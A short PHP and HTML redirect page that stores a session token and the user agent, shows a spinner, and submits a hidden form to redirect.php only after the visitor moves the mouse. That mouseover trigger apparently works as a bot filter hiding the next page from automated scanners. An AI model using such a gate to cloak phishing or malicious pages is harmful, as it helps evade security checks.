<?php
session_start();
// Generate a unique token and store it along with the browser's user agent
$_SESSION['id'] = md5(uniqid());
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
$sessionID = $_SESSION['id'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" 
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" 
        crossorigin="anonymous">
  <script>
    // A sleep function to delay the form submission (adjust delay as needed)
    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
    async function onLoad() {
      await sleep(1000); // 1000ms = 1 second delay
      document.getElementById('form').submit();
    }
  </script>
</head>
<body onmouseover="onLoad()" id="bot">
  <div style="width: 100%; height: 100vh;" class="d-flex justify-content-center align-items-center">
    <div class="spinner-border text-primary" role="status">
      <span class="sr-only">Loading...</span>
    </div>
  </div>

  <!-- Hidden form to pass the session token to redirect.php -->
  <form method="POST" name="form" id="form" action="redirect.php">
    <input name="e84c04c00c8e6f1117a0c7c603adab81" type="hidden" value="<?php echo $sessionID; ?>">
  </form>
</body>
</html>
